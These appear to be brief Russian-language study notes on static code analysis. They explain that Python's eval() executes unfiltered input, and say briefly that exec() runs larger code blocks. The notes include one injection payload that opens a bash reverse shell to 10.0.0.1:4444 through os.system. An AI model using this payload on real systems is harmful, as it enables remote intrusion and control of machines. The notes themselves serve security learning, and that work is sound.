Статичный анализ кода
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/

### Python
##### eval()
не проводит фильтрацию пользовательского ввода и выполняет то что в нее вставляют > см. shell 
```python
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')
```
##### exec()
Позволяет динамически выполнить блок кода Python и принимает большие блоки кода, в отличие от eval()